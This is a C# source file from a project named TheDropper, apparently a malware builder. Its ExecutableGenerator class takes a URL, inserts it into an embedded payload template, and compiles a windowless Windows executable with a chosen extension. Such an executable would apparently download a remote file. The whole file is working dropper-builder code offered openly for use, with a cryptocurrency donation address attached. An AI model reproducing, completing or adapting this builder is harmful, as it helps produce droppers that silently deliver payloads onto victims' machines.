/*
    $ TheDropper $

    ^ Author github.com/L1ghtM4n
    ^ Donate 1Lightx1nLy6DfH3W8WD1g4PugRu92M7GV (BTC)
*/

using System;
using System.IO;
using Microsoft.CSharp;
using System.Windows.Forms;
using System.CodeDom.Compiler;

namespace TheDropper.Generators
{
    internal class ExecutableGenerator
    {
        public static string fileUrl { get; private set; }
        public static string fileName { get; private set; }

        public ExecutableGenerator(string url)
        {
            Uri uri = new Uri(url);
            fileUrl = uri.AbsoluteUri;
            fileName = Path.GetFileName(uri.LocalPath);
        }

        /// <summary>
        /// Generate payload
        /// </summary>
        /// <param name="outExtension">Output payload extension</param>
        /// <returns>Payload path on disk</returns>
        public string Generate(string outExtension)
        {
            // Create payload
            string payload = Properties.Resources.exe_payload
                .Replace("{PAYLOAD_NAME}", fileName)
                .Replace("{PAYLOAD_URL}", fileUrl);
            // Create provider
            using (CSharpCodeProvider provider = new CSharpCodeProvider())
            {
                // Parameters
                CompilerParameters parameters = new CompilerParameters()
                {
                    GenerateInMemory = true,
                    GenerateExecutable = true,
                    CompilerOptions = "/t:winexe",
                    OutputAssembly = Path.Combine(Directory.GetCurrentDirectory(), "output." + outExtension)
                };
                // Add reference
                parameters.ReferencedAssemblies.Add("System.dll");
                // Compile
                CompilerResults results = provider.CompileAssemblyFromSource(parameters, payload);
                // Handle errors
                if (results.Errors.HasErrors)
                {
                    foreach (CompilerError error in results.Errors)
                    {
                        MessageBox.Show(error.ErrorText, error.ErrorNumber);
                    }
                }
                return parameters.OutputAssembly;
            }
        }
    }
}
